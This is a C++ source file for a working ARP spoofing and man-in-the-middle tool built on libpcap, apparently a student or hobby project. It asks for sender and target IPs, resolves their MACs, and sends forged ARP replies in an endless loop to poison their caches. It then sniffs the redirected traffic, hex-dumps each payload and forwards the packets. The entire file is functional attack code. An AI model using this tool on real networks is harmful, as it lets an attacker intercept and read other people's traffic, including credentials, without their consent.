#include "MyARPSpoofing.h"
#include "MyETHER.h"
#include "MyARP.h"
#include "MyIPHeader.h"
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <unistd.h>
#include <stdint.h>
#include <pcap.h>
#include <string>
#include <string.h>

using namespace std;

MyARPSpoofing::MyARPSpoofing()
{
    cout << "My Arp Spoofing Attack Start!" << endl;
    this->gateway_ip = this->get_gateway_ip();
    cout << "Gateway's IP :" << this->gateway_ip << endl;
}

string MyARPSpoofing::get_gateway_ip()
{
    char cmd [1000] = {0x0};
    sprintf(cmd,"route -n | grep ens33  | grep 'UG[ \t]' | awk '{print $2}'");
    FILE* fp = popen(cmd, "r");
    char line[256]={0x0};

    if(fgets(line, sizeof(line), fp) != NULL)
    {
        line[strlen(line)-1]=0;
        pclose(fp);
        return string(line);
    }
    else
    {
        perror("Cannot get gateway's ip address");
        exit(1);
    }
}

void MyARPSpoofing::set_arp_spoofing_attack()
{
    this->set_session_count();
    this->set_session_IP();

    cout << "Wait For To Get My IP & MAC" << endl << endl;

    this->set_my_ip();
    this->set_my_mac();

    cout << "Wait For To Get Session's IP & MAC" << endl << endl;

    this->set_session_MAC();

    for(int i=1;i<=this->session_count;i++)
    {
        cout << i << "th Sender IP : " << endl;
        cout << this->sender_ip[i] << endl;
        cout << i << "th Sender MAC : " << endl;
        cout << this->sender_mac[i] << endl;
        cout << i << "th Target IP : " << endl;
        cout << this->target_ip[i] << endl;
        cout << i << "th Target MAC : " << endl;
        cout << this->target_mac[i] << endl << endl;
    }
}

void MyARPSpoofing::set_session_count()
{
    while(1)
    {
        cout << "Input the number of arp spoofing session (1~10)" << endl << ": ";
        cin >> this->session_count;
        if(this->session_count > 10)
            cout << "Too many session" << endl;
        else
            break;
    }
}

void MyARPSpoofing::set_session_IP()
{
    for(int i=1;i<=this->session_count;i++)
    {
        cout << endl << "Input " << i << "th Sender IP" << endl;
        cin >> this->sender_ip[i];
        cout << "Input " << i << "th Target IP" << endl;
        cin >> this->target_ip[i];
    }
}

void MyARPSpoofing::set_my_ip()
{
    char cmd [1000] = {0x0};
    sprintf(cmd,"/sbin/ifconfig ens33 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'");
    FILE* fp = popen(cmd, "r");
    char line[256]={0x0};

    if(fgets(line, sizeof(line), fp) != NULL)
    {
        line[strlen(line)-1]=0;
        this->my_ip = string(line);
        pclose(fp);
    }
    else
    {
        perror("Cannot get my ip address");
        exit(1);
    }

}

void MyARPSpoofing::set_my_mac()
{
    char cmd [1000] = {0x0};
    sprintf(cmd,"/sbin/ifconfig ens33 | grep 'HWaddr' | awk '{ print $5}'");
    FILE* fp = popen(cmd, "r");
    char line[256]={0x0};

    if(fgets(line, sizeof(line), fp) != NULL)
    {
        line[strlen(line)-1]=0;
        for(int i=0;i<strlen(line);i++)
            line[i]=toupper(line[i]);
        this->my_mac = string(line);
        pclose(fp);
    }
    else
    {
        perror("Cannot get my mac address");
        exit(1);
    }

}

void MyARPSpoofing::set_session_MAC()
{
    for(int i=1;i<=this->session_count;i++)
    {
        cout << "Get " << i << "th session..." << endl;
        this->convert_ip_to_MAC(this->sender_ip[i], this->sender_mac[i]);
        this->convert_ip_to_MAC(this->target_ip[i], this->target_mac[i]);
    }
}

void MyARPSpoofing::convert_ip_to_MAC(string &IP, string &MAC)
{
    int pid = fork();

    if(pid == -1)
    {
        perror("Fork Error!!");
        exit(0);
    }
    else if(pid == 0)
    {
        sleep(2);
        uint8_t packet[1000];
        int size = 0;

        MyETHER *ptrETHER = (MyETHER *)&packet;

        ptrETHER->setDhostBroadCastFF();
        ptrETHER->setShost(my_mac);
        ptrETHER->set_ether_type(ETHERTYPE_ARP);

        size += sizeof(MyETHER);

        MyARP *ptrARP = (MyARP *)(packet + sizeof(MyETHER));

        ptrARP->set_ar_hrd(ARPHRD_ETHER);
        ptrARP->set_ar_pro(ETHERTYPE_IP);
        ptrARP->set_ar_hln(ETHER_ADDR_LEN);
        ptrARP->set_ar_pln(IPV4_ADDR_LEN);
        ptrARP->set_ar_op(ARPOP_REQUEST);

        ptrARP->set_arp_sha(my_mac);
        ptrARP->set_arp_spa(my_ip);
        ptrARP->set_arp_tha_broad_cast_00();
        ptrARP->set_arp_tpa(IP);

        size += sizeof(MyARP);

        this->sendpacket(packet, size);
        exit(0);
    }
    else
    {
        pcap_t *handle = NULL;          /* Session handle */
        char *dev = NULL;           /* The device to sniff on */
        char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */

        bpf_u_int32 mask = 0;       /* Our netmask */
        bpf_u_int32 net = 0;        /* Our IP */

        /* Define the device */
        dev = pcap_lookupdev(errbuf);
        if (dev == NULL)
        {
            fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
            exit(2);
        }

        /* Find the properties for the device */
        if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
        {
            fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
            net = 0;
            mask = 0;
            exit(2);
        }

        /* Open the session in promiscuous mode */
        handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if (handle == NULL)
        {
            fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
            exit(2);
        }

        int res = 0;
        struct pcap_pkthdr *header = NULL;  /* The header that pcap gives us */
        const uint8_t *packet = NULL;        /* The actual packet */

        while((res = pcap_next_ex(handle, &header, &packet)) >= 0)
        {
            if(res==0)
                continue;

            MyETHER *ptrETHER = (MyETHER *)packet;

            if( ptrETHER->get_ether_type() == ETHERTYPE_ARP)
            {
                MyARP *ptrARP = (MyARP *)(packet + sizeof(MyETHER));
                string tmp_IP;
                ptrARP->get_arp_tpa(tmp_IP);

                if(tmp_IP == IP)
                {
                    string tmp_MAC;
                    ptrARP->get_arp_sha(tmp_MAC);
                    MAC = tmp_MAC;
                    break;
                }
            }
        }

        pcap_close(handle);
    }
}

void MyARPSpoofing::sendpacket(uint8_t *buf, int size)
{
    pcap_t *handle = NULL;          /* Session handle */
    char *dev = NULL;           /* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */

    bpf_u_int32 mask = 0;       /* Our netmask */
    bpf_u_int32 net = 0;        /* Our IP */

    /* Define the device */
    dev = pcap_lookupdev(errbuf);
    if (dev == NULL)
    {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        exit(2);
    }

    /* Find the properties for the device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
    {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
        exit(2);
    }

    /* Open the session in promiscuous mode */
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL)
    {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        exit(2);
    }

    /* Send down the packet */
    if (pcap_sendpacket(handle, buf, size /* size */) != 0)
    {
        fprintf(stderr,"\nError sending the packet: \n");
        return;
    }

    pcap_close(handle);
}

void MyARPSpoofing::send_request_packet()
{
    return;
    /*
    uint8_t packet[1000];
    int size = 0;

    MyETHER *ptrETHER = (MyETHER *)&packet;

    ptrETHER->setDhostBroadCastFF();
    ptrETHER->setShost(my_mac);
    ptrETHER->set_ether_type(ETHERTYPE_ARP);

    size += sizeof(MyETHER);

    MyARP *ptrARP = (MyARP *)(packet + sizeof(MyETHER));

    ptrARP->set_ar_hrd(ARPHRD_ETHER);
    ptrARP->set_ar_pro(ETHERTYPE_IP);
    ptrARP->set_ar_hln(ETHER_ADDR_LEN);
    ptrARP->set_ar_pln(IPV4_ADDR_LEN);
    ptrARP->set_ar_op(ARPOP_REQUEST);

    ptrARP->set_arp_sha(my_mac);
    ptrARP->set_arp_spa(my_ip);
    ptrARP->set_arp_tha_broad_cast_00();
    ptrARP->set_arp_tpa(victim_ip);

    size += sizeof(MyARP);

    this->sendpacket(packet, size);*/
}

void MyARPSpoofing::send_spoof_packet_to_session_number(int session_number)
{
    uint8_t packet[1000];
    int size = 0;

    MyETHER *ptrETHER = (MyETHER *)&packet;

    ptrETHER->setDhostBroadCastFF();
    ptrETHER->setShost(my_mac);
    ptrETHER->set_ether_type(ETHERTYPE_ARP);

    size += sizeof(MyETHER);

    MyARP *ptrARP = (MyARP *)(packet + sizeof(MyETHER));

    ptrARP->set_ar_hrd(ARPHRD_ETHER);
    ptrARP->set_ar_pro(ETHERTYPE_IP);
    ptrARP->set_ar_hln(ETHER_ADDR_LEN);
    ptrARP->set_ar_pln(IPV4_ADDR_LEN);
    ptrARP->set_ar_op(ARPOP_REPLY);

    ptrARP->set_arp_sha(my_mac);
    ptrARP->set_arp_spa(target_ip[session_number]);
    ptrARP->set_arp_tha(sender_mac[session_number]);
    ptrARP->set_arp_tpa(sender_ip[session_number]);

    size += sizeof(MyARP);

    this->sendpacket(packet, size);
}

void MyARPSpoofing::arp_poisoning(void)
{

    int pid = fork();

    if(pid == -1)
    {
        perror("Fork Error!!");
        exit(0);
    }
    else if(pid == 0)
    {
        sleep(2);
        while(1)
        {
            for(int i=1;i<=this->session_count;i++)
                this->send_spoof_packet_to_session_number(i);
            sleep(2);
        }
    }
    else
    {
        pcap_t *handle = NULL;          /* Session handle */
        char *dev = NULL;           /* The device to sniff on */
        char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */

        bpf_u_int32 mask = 0;       /* Our netmask */
        bpf_u_int32 net = 0;        /* Our IP */

        /* Define the device */
        dev = pcap_lookupdev(errbuf);
        if (dev == NULL)
        {
            fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
            exit(2);
        }

        /* Find the properties for the device */
        if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
        {
            fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
            net = 0;
            mask = 0;
            exit(2);
        }

        /* Open the session in promiscuous mode */
        handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if (handle == NULL)
        {
            fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
            exit(2);
        }

        int res = 0;
        struct pcap_pkthdr *header = NULL;  /* The header that pcap gives us */
        uint8_t *packet = NULL;        /* The actual packet */

        while((res = pcap_next_ex(handle, &header, (const u_char**)&packet)) >= 0)
        {
            if(res==0)
                continue;

            MyETHER *ptrETHER = (MyETHER *)packet;

            if( ptrETHER->get_ether_type() == ETHERTYPE_ARP) // recovery check
            {
            }
            else if(ptrETHER->get_ether_type() == ETHERTYPE_IP)
            {
                string Dst_mac = ptrETHER->getDhost();
                string Src_mac = ptrETHER->getShost();
                if(Dst_mac != my_mac)
                    continue;
                MyIPHeader *ptrIPH = (MyIPHeader *)(packet + sizeof(MyETHER));
                string tmp_src_ip = ptrIPH->get_src_ip();
                string tmp_dst_ip = ptrIPH->get_dst_ip();
                for(int ind=1;ind<=this->session_count;ind++)
                {
                    if(Src_mac == sender_mac[ind] &&
                        (tmp_src_ip == sender_ip[ind]
                        || (gateway_ip == sender_ip[ind]
                            && tmp_src_ip.substr(0,tmp_src_ip.rfind("."))!=sender_ip[ind].substr(0,sender_ip[ind].rfind("."))))
                                && (tmp_dst_ip == target_ip[ind] 
                                    || (gateway_ip==target_ip[ind] 
                                        && tmp_dst_ip.substr(0,tmp_dst_ip.rfind("."))!=target_ip[ind].substr(0,target_ip[ind].rfind(".")))))
                    {
                        cout << ind << "th session's sniff packet" << endl;
                        ptrETHER->print();
                        cout << "src_ip : " << tmp_src_ip << endl;
                        cout << "dst_ip : " << tmp_dst_ip << endl;
                        cout << "data : " << endl;

                        u_char *Data_Section = (u_char *)ptrIPH + sizeof(MyIPHeader);
                        uint32_t Data_Len = header->len - sizeof(MyETHER) - sizeof(MyIPHeader);
                        for(int i = 0 ; i < Data_Len ; i+=16)
                        {
                            int Cnt = i+16;
                            if ( Cnt > Data_Len)
                                Cnt = Data_Len;
                            for(int j=i;j<Cnt;j++)
                            {
                                u_char tmp = *(Data_Section+j);
                                printf("%02x ", tmp);
                            }
                            for(int j=1;j<=55-3*(Cnt-i);j++)
                                printf(" ");
                            for(int j=i;j<Cnt;j++)
                            {
                                char tmp = *(Data_Section+j);
                                printf("%c", isprint((int)tmp)?tmp:'.');
                            }
                            printf("\n");
                        }

                        ptrETHER->setDhost(target_mac[ind]);
                        ptrETHER->setShost(my_mac);
                        this->sendpacket(packet, header->len);
                        break;
                    }
                }
            }
        }

        pcap_close(handle);
    }
}
